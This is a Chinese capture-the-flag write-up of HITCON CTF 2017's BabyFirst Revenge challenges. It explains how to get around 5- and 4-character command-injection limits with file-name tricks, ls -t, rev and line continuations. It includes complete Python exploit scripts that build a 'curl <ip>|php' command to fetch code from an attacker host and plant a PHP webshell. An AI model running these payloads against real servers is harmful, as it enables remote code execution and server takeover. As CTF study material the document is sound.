---
title: 如何绕过四个字符限制getshell
date: 2017-11-10 18:34:05
description: 巧用Linux命令实现限制条件下的注入
---

> 本文首发于安全客 (https://www.anquanke.com/post/id/87203)



### **前言**

本文主要整理如何巧用Linux命令绕过命令注入点的字符数量限制，内容围绕HITCON CTF 2017 的两道题展开，先讲五个字符的限制，再讲四个字符的。在此感谢下主办方分享这么有趣的点子。

### **热身**

问题的起源是 HITCON CTF 2017 的 BabyFirst Revenge 题，题目的主要代码如下：

```php
BabyFirst Revenge
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

### **冷静分析**

目标环境根据每个访问者的IP为其在sandbox里新建一个文件夹并作为其工作目录，接受并执行访问者提交的命令。访问者可随时通过提交reset来重置环境。这是个有限制无回显的后门，命令长度要求小于等于5 ，我们会希望利用这一点撕开口子，往服务器上写一个自己的木马，从而扩大命令执行范围。

我们所面临的最主要问题是能够执行的命令长度太短，因此考虑把命令写进文件里再执行，命令的功能是下载我们指定的文件。

在此之前，先做些知识铺垫。

#### **IP的等价表示法**

IP地址本质上就是一个整数，只是通常用点分十进制表示，以至于我们反而不太熟悉它本来的样子。只要必要，我们可以用十六进制、长整数、八进制表示IP，大部分情况下效果是相同的。

![t010e7a86cdf1618e75](t010e7a86cdf1618e75.png)

它们之间的转换也很方便：

```python
ip = '127.0.0.1'
# 十六进制
print '0x' + ''.join([str(hex(int(i))[2:].zfill(2))
                   for i in ip.split('.')])
# 长整数
print int(''.join([str(hex(int(i))[2:].zfill(2))
                   for i in ip.split('.')]), 16)
# 八进制
print '0' + oct(int(''.join([str(hex(int(i))[2:].zfill(2))
                   for i in ip.split('.')]), 16))
```

#### **从网络下载文件**

![t0179a43f9481b4fbc6.png](t0179a43f9481b4fbc6.png)

#### **利用续行符拆分命令成多行**

![t01745a941a746a7ac0.png](t01d2eac72941e42be9.png)

#### **用两个字符在Linux下创建文件**

![t01485c8bfc8fbf987f.png](t019808b722225de73d.png)

#### **将命令执行结果重定向到文件**

![http://p9.qhimg.com/t01e45c7a16d86c4e2c.png](t012de068258a2e3d04.png)

#### **利用重定向向文件追加内容**

![http://p2.qhimg.com/t0125c23ce2f3d45621.png](t015f5da0f73df752b7.png)

#### **删除文件**

![http://p4.qhimg.com/t01e267cc27d6277631.png](t0121856133157c3f34.png)

#### **ls 的文件排列顺序**

一句alphabetical耐人寻味，不过大致顺序就是如下图所示。

![http://p7.qhimg.com/t01e104d2e591a66fcd.png](t01c4dd700d11f91860.png)

****

### **开始表演**

假设我有一台目标服务器能够访问到的公网主机，为了方便我把该主机IP转换成长整数，然后利用以上的知识将 curl ip > A 用续行方式切割成多行写进文件 A ，然后执行 sh A 就可以下载到预先放在公网主机上的文件并且覆盖本地的文件A，而下载下来的文件内容是用来写PHP木马的PHP代码，我再执行 php A就可以写个自己的webshell进去啦。

![http://p8.qhimg.com/t0106f100f423201580.png](t016294d3a767429eab.png)

这里比较取巧的是我的公网IP转成长整形恰好能分割成顺序的四段，如果构造不出来，可以试试十六进制，八进制，找台能用的主机等等：）或者继续往下看，还会有其他办法。

另外，其实GET也是能用的，只是目标主机里没有安装所以这题不能用。

接下来让我们完成最后30%的工作，写个exp。

```python
# -*- coding:utf8 -*-
import requests as r
import hashlib
url = 'http://52.199.204.34/'
# 查询自己的IP
ip = r.get('http://ipv4.icanhazip.com/').text.strip()
sandbox = url + 'sandbox/' + hashlib.md5('orange' + ip).hexdigest() + '/'
 
reset = url + '?reset'
cmd = url + '?cmd='
build = ['>cur\',
         '>l \',
         'ls>A',
         'rm c*',
         'rm l*',
         '>105\',
         '>304\',
         '>301\',
         '>9>\',
         'ls>>A',
         'sh A',
         'php A'
         ]
# 如果目标服务器有GET，这个也是可以打的
# build = ['>GE\',
#          '>T\ \',
#          'ls>A',
#          'rm G*',
#          'rm T*',
#          '>105\',
#          '>304\',
#          '>301\',
#          '>9>\',
#          'ls>>A']
r.get(reset)
for i in build:
    s = r.get(cmd + i)
    print '[%s]' % s.status_code, s.url
 
s = r.get(sandbox + 'fun.php?cmd=uname -a')
print 'n' + '[%s]' % s.status_code, s.url
print s.text
```

#### 运行效果

![http://p1.qhimg.com/t013370047191f9904f.png](t014cfd9d61e5c45b44.png)

****

### **挑战升级**

这篇文章有趣的地方才刚刚开始。

代码只改了一个字符，但趣味已经不在一个量级。一脸懵逼的我看了大佬们的wp后兴奋不已。

BabyFirst Revenge v2：

```python
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR'])
 
    @mkdir($sandbox)
    @chdir($sandbox)
    if (isset($_GET['cmd']) & & strlen($_GET['cmd']) <= 4) {
        @exec($_GET['cmd'])
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox)
    }
    highlight_file(__FILE__)
```

### **热烈分析**

只有四个字符的施展空间意味着我们能做的事情少之又少，但Linux本身的简洁给了我们机会。

突破之旅从神奇的星号 * 开始。

![http://p1.qhimg.com/t011d2b1095c9235710.png](t01c68ec189f2c38155.png)

经过简单测试我们猜测 * 的作用相当于 `ls` 。这其实相当厉害，我们本就基本上可以创建任意名字的短文件，现在又可以一个字符就把这些文件名连起来当作命令执行，这提供了很大的想象空间。

![http://p1.qhimg.com/t016acaa6a8c9c4497c.png](t01fbeb47c643a3f4fd.png)

还有本质上一样但现象很有趣的，待会儿会用到：

![http://p7.qhimg.com/t015afceef8c0976153.png](t01cdd7b9abeb575d5f.png)

虽然这些特技提供了一些可能性，但是 ls 列出的文件顺序问题仍然是个挑战，我们很难在 alphabetical 序的基础上构造出有用的命令。

写入时间是我们可以控制的，如果能执行 ls –t（将文件按时间排序输出），那么只要把想执行的命令分割成若干段然后逆序写入，就可以随心所欲地构造出任意命令。考虑到 ls -t 本身就已经有4个字符了，我们故技重施，先将 ls -t > f 写入文件 g 中，然后执行 sh g 即可将我们分段逆序写入的命令拼接起来。

在开始操作前，再介绍两个会用到的命令：dir 和 rev。

****

#### **dir**

在GNU文档中有下图这样的描述：

![http://p1.qhimg.com/t014c12aa56fd9386f9.png](https://p5.ssl.qhimg.com/t01406e4dcc8e6ff0f7.png)

虽然基本上和 ls 一样，但有两个好处，一是开头字母是d ，这使得它在 alphabetical 序中靠前，二是按列输出，不换行。

#### **rev**

这个前面出场过，可以反转文件每一行的内容。

![http://p8.qhimg.com/t01184834f69bddb51a.png](t010c4a372f495ce020.png)

实验一下：

![http://p2.qhimg.com/t0192fac539940680bc.png](t016a0cf34a18724b08.png)

### **开始挑战**

需要知道的命令和 tips 都已经介绍了，下面是代码和解释：

```python
#-*-coding:utf8-*-
import requests as r
from time import sleep
import random
import hashlib
target = 'http://52.197.41.31/'
 
# 存放待下载文件的公网主机的IP
shell_ip = 'xx.xx.xx.xx'
 
# 本机IP
your_ip = r.get('http://ipv4.icanhazip.com/').text.strip()
 
# 将shell_IP转换成十六进制
ip = '0x' + ''.join([str(hex(int(i))[2:].zfill(2))
                     for i in shell_ip.split('.')])
 
reset = target + '?reset'
cmd = target + '?cmd='
sandbox = target + 'sandbox/' + 
    hashlib.md5('orange' + your_ip).hexdigest() + '/'
 
# payload某些位置的可选字符
pos0 = random.choice('efgh')
pos1 = random.choice('hkpq')
pos2 = 'g'  # 随意选择字符
 
payload = [
    '>dir',
    # 创建名为 dir 的文件
 
    '>%s>' % pos0,
    # 假设pos0选择 f , 创建名为 f> 的文件
 
    '>%st-' % pos1,
    # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，
    # 因为alphabetical序中t>s
 
    '>sl',
    # 创建名为 >sl 的文件；到此处有四个文件，
    # ls 的结果会是：dir f> kt- sl
 
    '*>v',
    # 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f> kt- sl`>v ，
    #  前面提到dir是不换行的，所以这时会创建文件 v 并写入 f> kt- sl
    # 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符
 
    '>rev',
    # 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f> kt- rev sl v
 
    '*v>%s' % pos2,
    # 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。
    # 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk > f
 
    # 续行分割 curl 0x11223344|php 并逆序写入
    '>p',
    '>ph\',
    '>|\',
    '>%s\' % ip[8:10],
    '>%s\' % ip[6:8],
    '>%s\' % ip[4:6],
    '>%s\' % ip[2:4],
    '>%s\' % ip[0:2],
    '> \',
    '>rl\',
    '>cu\',
 
    'sh ' + pos2,
    # sh g ;g 的内容是 ls -tk > f ，那么就会把逆序的命令反转回来，
    # 虽然 f 的文件头部会有杂质，但不影响有效命令的执行
    'sh ' + pos0,
    # sh f 执行curl命令，下载文件，写入木马。
]
 
s = r.get(reset)
for i in payload:
    assert len(i) <= 4
    s = r.get(cmd + i)
    print '[%d]' % s.status_code, s.url
    sleep(0.1)
s = r.get(sandbox + 'fun.php?cmd=uname -a')
print '[%d]' % s.status_code, s.url
print s.text
```

#### 运行效果

![http://p8.qhimg.com/t01b1145c403a84ced2.png](t01d42702502e8f186e.png)

****

### **后记**

我相信除了文中给出的方法外一定还有一些奇招，大家可以多多探索，可以围观HITCON CTF 2107的[官方解答区](http://t.cn/RlNVPfp)，还可以学习下Phithon师傅的《[小密圈里的那些奇技淫巧](http://t.cn/RlNcllC)》 中与本文主题相关的部分。

最后，如果关于文章内容有任何建议或疑惑，你可以在<https://findneo.github.io/> 联系本文作者。感谢阅读o/



------

本文由**安全客**原创发布
如若转载，请注明出处： <https://www.anquanke.com/post/id/87203>

安全客 - 有思想的安全新媒体